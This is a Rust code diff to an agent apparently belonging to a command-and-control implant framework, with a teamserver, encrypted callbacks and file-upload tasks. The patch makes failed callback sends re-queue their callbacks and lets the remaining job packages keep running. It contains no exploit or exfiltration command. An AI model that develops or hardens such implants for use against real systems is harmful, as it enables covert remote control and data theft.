@@ -65,7 +65,10 @@ impl PhantomAgent {
         let mut exit_requested = false;
         for package in packages {
             execute(&package, &mut self.config, &mut self.state).await?;
-            for callback in self.state.drain_callbacks() {
+            let mut callbacks = self.state.drain_callbacks();
+            let mut idx = 0;
+            while idx < callbacks.len() {
+                let callback = &callbacks[idx];
                 let payload = callback.payload()?;
                 let packet = build_callback_packet(
                     self.agent_id,
@@ -76,11 +79,24 @@ impl PhantomAgent {
                     callback.request_id(),
                     &payload,
                 )?;
-                self.send_packet(packet).await?;
-                self.ctr_offset += callback_ctr_blocks(payload.len());
-                self.callback_seq += 1;
-                if matches!(callback, PendingCallback::Exit { .. }) {
-                    exit_requested = true;
+                match self.send_packet(packet).await {
+                    Ok(()) => {
+                        self.ctr_offset += callback_ctr_blocks(payload.len());
+                        self.callback_seq += 1;
+                        if matches!(callback, PendingCallback::Exit { .. }) {
+                            exit_requested = true;
+                        }
+                        idx += 1;
+                    }
+                    Err(e) => {
+                        warn!(
+                            error = %e,
+                            "failed to send callback; re-queuing remaining — continuing remaining job packages"
+                        );
+                        let tail = callbacks.split_off(idx);
+                        self.state.requeue_callbacks_front(tail);
+                        break;
+                    }
                 }
             }
         }
@@ -127,9 +143,16 @@ impl PhantomAgent {
                     }
                 };
                 if let Err(e) = self.ecdh_send_packages(pkgs).await {
-                    warn!(error = %e, "ecdh: failed to send callback batch; re-queuing callbacks");
+                    // Do not abort the rest of this job message: the teamserver has already
+                    // dequeued every package in the batch. Returning early would leave later
+                    // tasks never executed (e.g. CommandFs upload after CommandMemFile chunks)
+                    // while callbacks sit un-flushed until a later check-in — the classic
+                    // scenario-06 symptom ("queue accepted, file never appears").
+                    warn!(
+                        error = %e,
+                        "ecdh: failed to send callback batch; re-queuing callbacks — continuing remaining job packages"
+                    );
                     self.state.requeue_callbacks_front(recovery);
-                    return Err(e);
                 }
             }
         }
